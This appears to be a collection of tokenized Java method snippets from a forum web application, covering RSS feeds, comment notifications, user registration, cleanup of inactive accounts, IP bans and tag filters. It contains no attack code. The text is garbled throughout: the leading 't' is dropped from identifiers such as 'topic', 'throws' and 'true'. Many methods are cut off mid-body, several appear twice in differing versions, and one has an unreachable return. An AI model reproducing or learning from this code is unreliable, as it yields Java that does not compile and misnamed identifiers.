public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean ech ) { logger . debug ( " TopicListService.getRssTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . oString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . oString ( ) : " (null) " ) + " ; fromDate= " + fromDate + " ; noTalks= " + noTalks + " ; tech= " + ech ) ; TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } opicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; opicListDto . setFromDate ( fromDate ) ; opicListDto . setNotalks ( noTalks ) ; opicListDto . setTech ( ech ) ; opicListDto . setLimit ( 100 ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return opicListDao . getTopics ( opicListDto , null ) ; } 
public Set < Integer > makeHideSet ( CommentList comments , int filterChain , @Nonnull Set < Integer > ignoreList ) hrows UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return ImmutableSet . of ( ) ; } Set < Integer > hideSet = new HashSet < > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ! ignoreList . isEmpty ( ) ) { comments . getRoot ( ) . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
private void notifyMentions ( User author , Comment comment , MessageText commentBody , int commentId ) { Set < User > userRefs = extService . mentions ( commentBody ) ; userRefs = userRefs . stream ( ) . filter ( p - > ! userService . isIgnoring ( p . getId ( ) , author . getId ( ) ) ) . collect ( Collectors . oSet ( ) ) ; userEventService . addUserRefEvent ( userRefs , comment . getTopicId ( ) , commentId ) ; } 
public void insertCommentWatchNotification ( Comment comment , Optional < Comment > parentComment , int commentId ) { Map < String , Integer > params = new HashMap < > ( ) ; params . put ( " opic " , comment . getTopicId ( ) ) ; params . put ( " id " , commentId ) ; params . put ( " userid " , comment . getUserid ( ) ) ; if ( parentComment . isPresent ( ) ) { params . put ( " parent_author " , parentComment . get ( ) . getUserid ( ) ) ; 
public void addReplyEvent ( User parentAuthor , int opicId , int commentId ) { userEventDao . addEvent ( ANSWERS . getType ( ) , 
public void insertCommentWatchNotification ( Comment comment , Optional < Comment > parentComment , int commentId ) { userEventDao . insertCommentWatchNotification ( comment , parentComment , commentId ) ; } 
public UserEventDao userEventDao ( DataSource ds ) { return new UserEventDao ( ds ) ; } 
private Set < User > notifyMentions ( User author , Comment comment , MessageText commentBody , int commentId ) { Set < User > userRefs = extService . mentions ( commentBody ) ; userRefs = userRefs . stream ( ) . filter ( p - > ! userService . isIgnoring ( p . getId ( ) , author . getId ( ) ) ) . collect ( Collectors . oSet ( ) ) ; userEventService . addUserRefEvent ( userRefs , comment . getTopicId ( ) , commentId ) ; return userRefs ; } 
public List < Integer > insertCommentWatchNotification ( Comment comment , Optional < Comment > parentComment , int commentId ) { return userEventDao . insertCommentWatchNotification ( comment , parentComment , commentId ) ; } 
private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , MessageText message , UploadedImagePreview scrn , Topic previewMsg ) hrows Exception { session . removeAttribute ( " image " ) ; Tuple2 < Integer , Set < Integer > > result = opicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; int msgid = result . _1 ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; RealtimeEventHub . notifyEvents ( realtimeHubWS , result . _2 ) ; } String messageUrl = " view-message.jsp?msgid= " + msgid ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( messageUrl ) ) ; 
public String resetNotifications ( HttpServletRequest request , @RequestParam int opId ) { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " not authorized " ) ; } User currentUser = mpl . getCurrentUser ( ) ; userEventService . resetUnreadReplies ( currentUser , opId ) ; RealtimeEventHub . notifyEvents ( realtimeHubWS , ImmutableList . of ( currentUser . getId ( ) ) ) ; return " ok " ; } 
public List < Integer > processCommentsDeleted ( List < Integer > msgids ) { List < Integer > users = userEventDao . deleteCommentEvents ( msgids ) ; userEventDao . recalcEventCount ( users ) ; return users ; } 
public int createUser ( String name , String nick , String password , String url , InternetAddress mail , String own , String ip ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; int userid = jdbcTemplate . queryForObject ( " select nextval('s_uid') as userid " , Integer . class ) ; jdbcTemplate . update ( " INSERT INTO users " + " (id, name, nick, passwd, url, email, town, score, max_score,regdate) " + " VALUES (?,?,?,?,?,?,?,45,45,current_timestamp) " , userid , name , nick , encryptor . encryptPassword ( password ) , url = = null ? null : URLUtil . fixURL ( url ) , mail . getAddress ( ) , own ) ; return userid ; } 
public void logRegister ( int userid , @Nonnull String ip , Optional < Integer > invitedBy ) { ImmutableMap < String , String > params ; if ( invitedBy . isPresent ( ) ) { params = ImmutableMap . of ( OPTION_IP , ip , OPTION_INVITED_BY , invitedBy . get ( ) . oString ( ) ) ; } else { params = ImmutableMap . of ( OPTION_IP , ip ) ; } jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public List < PreparedUserLogItem > prepare ( @Nonnull List < UserLogItem > items ) { return ImmutableList . copyOf ( Lists . ransform ( items , item - > { 
public void deleteInactivated ( ) { logger . info ( " Deleting non-activated accounts " ) ; jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'1 days'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'1 days'::interval) " ) ; int deleted = jdbcTemplate . update ( " delete from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'1 days'::interval " ) ; jdbcTemplate . update ( " delete from ban_info where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval) " ) ; jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval) " ) ; int deletedBlocked = jdbcTemplate . update ( " delete from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval " ) ; logger . info ( " Deleted {} non-activated; {} blocked accounts " , deleted , deletedBlocked ) ; } 
public boolean isGoodDomainEmail ( InternetAddress email ) { return ! BAD_DOMAINS . contains ( email . getAddress ( ) . replaceFirst ( " ^[^@]+@ " , " " ) . oLowerCase ( ) ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( validator ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public void checkView ( Group group , Topic message , @Nullable User currentUser , User opicAuthor , boolean showDeleted ) hrows MessageNotFoundException , AccessViolationException { Preconditions . checkArgument ( message . getGroupId ( ) = = group . getId ( ) ) ; Preconditions . checkArgument ( message . getAuthorUserId ( ) = = opicAuthor . getId ( ) ) ; if ( currentUser = = null | | ! currentUser . isModerator ( ) ) { boolean unauthorized = currentUser = = null | | currentUser . isAnonymous ( ) ; 
public boolean isShowPhotos ( ) { return false ; return showPhotos; 
public void deleteInactivated ( ) { logger . info ( " Deleting non-activated accounts " ) ; jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'12 hours'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'12 hours'::interval) " ) ; int deleted = jdbcTemplate . update ( " delete from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'12 hours'::interval " ) ; jdbcTemplate . update ( " delete from ban_info where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval) " ) ; jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval) " ) ; int deletedBlocked = jdbcTemplate . update ( " delete from users where not activated and regdate<CURRENT_TIMESTAMP-'30 days'::interval " ) ; logger . info ( " Deleted {} non-activated; {} blocked accounts " , deleted , deletedBlocked ) ; } 
public Tuple2 < Integer , DateTime > mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return Tuple2 . apply ( rs . getInt ( " id " ) , new DateTime ( rs . getTimestamp ( " lastlogin " ) . getTime ( ) ) ) ; } 
public boolean canCorrect ( ) { return corrector & & ! isFrozen ( ) ; } 
public void oggleCorrector ( User user , User moderator ) { if ( user . isCorrector ( ) ) { jdbcTemplate . update ( " UPDATE users SET corrector='f' WHERE id=? " , user . getId ( ) ) ; 
private ApiDeleteInfo loadDeleteInfo ( Comment comment ) hrows UserNotFoundException { ApiDeleteInfo deleteInfo = null ; if ( comment . isDeleted ( ) ) { Optional < DeleteInfo > info = deleteInfoDao . getDeleteInfo ( comment . getId ( ) ) ; deleteInfo = info . map ( i - > new ApiDeleteInfo ( userDao . getUserCached ( i . getUserid ( ) ) . getNick ( ) , i . getReason ( ) ) ) . orElse ( null ) ; } return deleteInfo ; } 
public ModelAndView getMessageOld ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " lastmod " , required = false ) Long lastmod , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( required = false ) String output ) { Topic opic = messageDao . getById ( msgid ) ; StringBuilder link = new StringBuilder ( opic . getLink ( ) ) ; StringBuilder params = new StringBuilder ( ) ; if ( page ! = null ) { link . append ( " /page " ) . append ( page ) ; } if ( lastmod ! = null & & ! opic . isExpired ( ) ) { params . append ( " ?lastmod= " ) . append ( opic . getLastModified ( ) . getTime ( ) ) ; } if ( filter ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " filter= " ) . append ( filter ) ; } if ( output ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " output= " ) . append ( output ) ; } link . append ( params ) ; return new ModelAndView ( new RedirectView ( link . oString ( ) ) ) ; } 
public PreparedTopic prepareTopic ( Topic message , User user ) { return prepareTopic ( message , 
public PreparedTopic prepareTopic ( Topic message , List < TagRef > ags , User user , MessageText ext ) { return prepareTopic ( message , 
public PreparedTopic prepareTopicPreview ( Topic message , List < TagRef > ags , Poll newPoll , MessageText ext , Image image ) { return prepareTopic ( message , 
private PreparedTopic prepareTopic ( Topic opic , List < TagRef > ags , boolean minimizeCut , Optional < PreparedPoll > poll , User user , MessageText ext , Optional < Image > image ) { ry { Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , User user , Profile profile , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > ags = opicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareTopic ( message , ags . get ( message . getId ( ) ) , rue , Optional . empty ( ) , user , extMap . get ( message . getId ( ) ) , Optional . empty ( ) ) ; TopicMenu opicMenu = getTopicMenu ( preparedMessage , user , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
private Map < Integer , MessageText > loadTexts ( List < Topic > messages ) { return msgbaseDao . getMessageText ( messages . stream ( ) . map ( Topic : : getId ) . collect ( Collectors . oList ( ) ) ) ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages ) { List < PreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > ags = opicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareTopic ( message , ags . get ( message . getId ( ) ) , rue , Optional . empty ( ) , null , extMap . get ( message . getId ( ) ) , Optional . empty ( ) ) ; pm . add ( preparedMessage ) ; } return pm ; } 
private Optional < DeleteInfo > loadDeleteInfo ( Comment comment ) { if ( comment . isDeleted ( ) ) { return deleteInfoDao . getDeleteInfo ( comment . getId ( ) ) ; 
private PreparedRSSComment prepareRSSComment ( MessageText messageText , Comment comment ) { User author = userService . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = extService . renderTextRSS ( messageText ) ; return new PreparedRSSComment ( comment , author , processedMessage ) ; } 
public PreparedComment prepareCommentForReplyto ( Comment comment , @Nullable User currentUser , Profile profile , Topic opic ) { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; User author = userService . getUserCached ( comment . getUserid ( ) ) ; return prepareComment ( messageText , author , Optional . empty ( ) , comment , Optional . empty ( ) , profile , opic , ImmutableSet . of ( ) , ImmutableSet . of ( ) , currentUser ) ; } 
public PreparedComment prepareCommentForEdit ( Comment comment , MessageText message ) { User author = userService . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = extService . renderCommentText ( message , false ) ; ApiUserRef ref = userService . ref ( author , null ) ; return new PreparedComment ( comment , 
public List < PreparedRSSComment > prepareCommentListRSS ( List < Comment > list ) { List < PreparedRSSComment > commentsPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; commentsPrepared . add ( prepareRSSComment ( messageText , comment ) ) ; } return commentsPrepared ; } 
public List < PreparedComment > prepareCommentList ( CommentList comments , List < Comment > list , Topic opic , Set < Integer > hideSet , @Nullable User currentUser , Profile profile ) { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > exts = msgbaseDao . getMessageText ( list . stream ( ) . map ( Comment : : getId ) . collect ( Collectors . oList ( ) ) ) ; Map < Integer , User > users = loadUsers ( list . stream ( ) . map ( Comment : : getUserid ) . collect ( Collectors . oList ( ) ) ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } Set < Integer > samePageComments = list . stream ( ) . map ( Comment : : getId ) . collect ( Collectors . oSet ( ) ) ; return list . stream ( ) . map ( comment - > { MessageText ext = exts . get ( comment . getId ( ) ) ; 
public List < PreparedCommentsListItem > prepareCommentsList ( List < CommentsListItem > comments ) { Map < Integer , User > users = loadUsers ( comments . stream ( ) . map ( CommentsListItem : : getAuthorId ) . collect ( Collectors . oList ( ) ) ) ; Map < Integer , MessageText > exts = msgbaseDao . getMessageText ( comments . stream ( ) . map ( CommentsListItem : : getCommentId ) . collect ( Collectors . oList ( ) ) ) ; return comments . stream ( ) . map ( comment - > { User author = users . get ( comment . authorId ( ) ) ; 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoreTagName " , required = false ) String newIgnoreTagName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarksJava ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , rue ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoreTagName ! = null & & TagName . isGoodTag ( newIgnoreTagName ) ) { modelAndView . addObject ( " newIgnoreTagName " , newIgnoreTagName ) ; } return modelAndView ; } 
Map < String , Object > favoriteTagDelJSON ( ServletRequest request , @RequestParam String agName ) hrows TagNotFoundException , AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; int agId = userTagService . favoriteDel ( user , agName ) ; return ImmutableMap . of ( " count " , userTagService . countFavs ( agId ) ) ; } 
public static DateTimeFormatter dateLong ( ) { return DATE_LONG ; } 
public ModelAndView getMessageNewMain ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid , skipDeleted ) ; } Section section = sectionService . getSectionByName ( sectionName ) ; boolean rss = request . getParameter ( " output " ) ! = null & & " rss " . equals ( request . getParameter ( " output " ) ) ; if ( rss ) { return getMessageRss ( section , request , response , groupName , msgid ) ; 
public ModelAndView getMessageNewPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) { Section section = sectionService . getSectionByName ( sectionName ) ; return getMessage ( section , webRequest , request , response , page , filter , groupName , msgid , 0 ) ; } 
public ModelAndView getMessageThread ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " hreadRoot " ) int hreadRoot ) { Section section = sectionService . getSectionByName ( sectionName ) ; return getMessage ( section , webRequest , request , response , 0 , filter , groupName , msgid , hreadRoot ) ; } 
public ModelAndView jumpMessage ( HttpServletRequest request , @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) Integer cid ) { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid , false ) ; } Topic opic = messageDao . getById ( msgid ) ; TopicLinkBuilder builder ; if ( page ! = null ) { builder = TopicLinkBuilder . pageLink ( opic , page ) ; } else { builder = TopicLinkBuilder . baseLink ( opic ) ; } return new ModelAndView ( new RedirectView ( builder . build ( ) ) ) ; } 
public TopicMenu getTopicMenu ( PreparedTopic message , @Nullable User currentUser , Profile profile , boolean loadUserpics ) { boolean opicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean agsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; boolean deletable ; boolean undeletable ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; undeletable = groupPermissionService . isUndeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; deletable = false ; undeletable = false ; } Optional < Userpic > userpic ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = Optional . of ( userService . getUserpic ( message . getAuthor ( ) , profile . getAvatarMode ( ) , rue ) ) ; } else { userpic = Optional . empty ( ) ; } int postscore = opicPermissionService . getPostscore ( message . getGroup ( ) , message . getMessage ( ) ) ; boolean showComments = postscore ! = TopicPermissionService . POSTSCORE_HIDE_COMMENTS ; return new TopicMenu ( opicEditable , 
public UserEventDao userEventDao ( DataSource ds , PlatformTransactionManager ransactionManager ) { return new UserEventDao ( ds , ransactionManager ) ; } 
public ModelAndView serverInfo ( ) { List < Tuple2 < User , Object > > moderators = userService . getModerators ( ) ; ModelAndView mv = new ModelAndView ( " server " ) ; mv . getModel ( ) . put ( " moderators " , moderators ) ; List < Tuple2 < User , Object > > correctors = userService . getCorrectors ( ) ; mv . getModel ( ) . put ( " correctors " , correctors ) ; return mv ; } 
public UserDao userDao ( UserLogDao userLogDao , DataSource dataSource ) { return new UserDao ( userLogDao , dataSource ) ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " ime " ) String ime , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) boolean allowPosting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) boolean captchaRequired ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( ime ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( ime ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( ime ) ) { } else if ( " custom " . equals ( ime ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { hrow new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp s ; if ( " unlim " . equals ( ime ) ) { s = null ; } else { s = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = Template . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user . getId ( ) , reason , s , allowPosting , captchaRequired ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip , StandardCharsets . UTF_8 ) ) ) ; } 
public ModelAndView showEditInfo ( @PathVariable ( " id " ) int msgid ) { Topic message = messageDao . getById ( msgid ) ; Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; PreparedTopic preparedMessage = opicPrepareService . prepareTopic ( message , Template . getCurrentUser ( ) ) ; opicPermissionService . checkView ( group , message , Template . getCurrentUser ( ) , preparedMessage . getAuthor ( ) , false ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; modelAndView . getModel ( ) . put ( " canRestore " , groupPermissionService . isEditable ( preparedMessage , Template . getCurrentUser ( ) ) ) ; return modelAndView ; } 
public ModelAndView showCommentEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid , @PathVariable ( " commentid " ) int commentId ) { Topic message = messageDao . getById ( msgid ) ; Comment comment = commentService . getById ( commentId ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( comment ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; modelAndView . getModel ( ) . put ( " canRestore " , false ) ; return modelAndView ; } 
public ModelAndView deleteForm ( @RequestParam int id , HttpServletRequest request ) { Image image = imageDao . getImage ( id ) ; Topic opic = opicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( opic , Template . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , Template . getCurrentUser ( ) ) ; ModelAndView mv = new ModelAndView ( " delete_image " ) ; mv . addObject ( " image " , image ) ; mv . addObject ( " preparedTopic " , preparedTopic ) ; return mv ; } 
public RedirectView deleteImage ( @RequestParam int id , HttpServletRequest request ) { Image image = imageDao . getImage ( id ) ; Topic opic = opicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( opic , Template . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , Template . getCurrentUser ( ) ) ; imageService . deleteImage ( Template . getCurrentUser ( ) , image ) ; return new RedirectView ( TopicLinkBuilder . baseLink ( opic ) . forceLastmod ( ) . build ( ) ) ; } 
public ModelAndView opics ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) { Group group = groupDao . getGroup ( groupId ) ; if ( offsetObject ! = null ) { return new ModelAndView ( new RedirectView ( group . getUrl ( ) + " ?offset= " + offsetObject ) ) ; 
public ModelAndView opicsLastmod ( @RequestParam ( " group " ) int groupId , @RequestParam ( value = " offset " , required = false ) Integer offsetObject ) { Group group = groupDao . getGroup ( groupId ) ; if ( offsetObject ! = null ) { return new ModelAndView ( new RedirectView ( group . getUrl ( ) + " ?offset= " + offsetObject + " &lastmod=true " ) ) ; 
private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , MessageText message , UploadedImagePreview scrn , Topic previewMsg ) { session . removeAttribute ( " image " ) ; Tuple2 < Integer , Set < Integer > > result = opicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; int msgid = result . _1 ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; RealtimeEventHub . notifyEvents ( realtimeHubWS , result . _2 ) ; } String messageUrl = " view-message.jsp?msgid= " + msgid ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( messageUrl ) ) ; 
public ModelAndView getMessageNewMain ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid , skipDeleted ) ; } Section section = sectionService . getSectionByName ( sectionName ) ; boolean rss = request . getParameter ( " output " ) ! = null & & " rss " . equals ( request . getParameter ( " output " ) ) ; if ( rss ) { return getMessageRss ( section , response , groupName , msgid ) ; 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " ext " ) String ext , @PathVariable String nick ) { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } if ( ext . length ( ) > 255 ) { ext = ext . substring ( 0 , 255 ) ; } User user = Template . getCurrentUser ( ) ; User refUser = userService . getUserCached ( nick ) ; remarkDao . setOrUpdateRemark ( user , refUser , ext ) ; return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoreTagName " , required = false ) String newIgnoreTagName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = Template . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarksJava ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , rue ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoreTagName ! = null & & TagName . isGoodTag ( newIgnoreTagName ) ) { modelAndView . addObject ( " newIgnoreTagName " , newIgnoreTagName ) ; } return modelAndView ; } 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = Template . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userService . getUserCached ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
